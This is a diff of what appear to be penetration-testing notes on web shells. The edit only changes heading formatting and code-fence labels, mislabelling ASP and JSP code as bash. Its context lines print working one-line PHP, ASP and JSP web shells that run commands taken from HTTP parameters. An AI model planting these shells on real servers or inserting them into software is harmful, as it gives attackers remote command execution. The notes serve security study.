@@ -156,7 +156,7 @@ Communication through a **Web Server** to get *Remote Command Execution (RCE)*
 
 It accepts the *System Commands* via *HTTP Parameters (GET/POST)*, executes them and prints back its output on the web page
 
-##### *PHP*
+##### PHP
 
 ```php
 <?php system($_GET['cmd']); ?> // or $_REQUEST
@@ -198,19 +198,19 @@ To check for *dangerous functions* that are not disabled, i.e. *php functions* t
 > ```
 >
 
-##### *ASP*
+##### ASP
 
-```asp
+```bash
 <% eval request("cmd") %>
 ```
 
-##### *JSP*
+##### JSP
 
-```jsp
+```bash
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
 
-##### *Common Web Server System Paths*
+##### Common Web Server System Paths
 
 These *Web Shell* have to be uploaded to the *Web Server* in order to be able to execute it
 
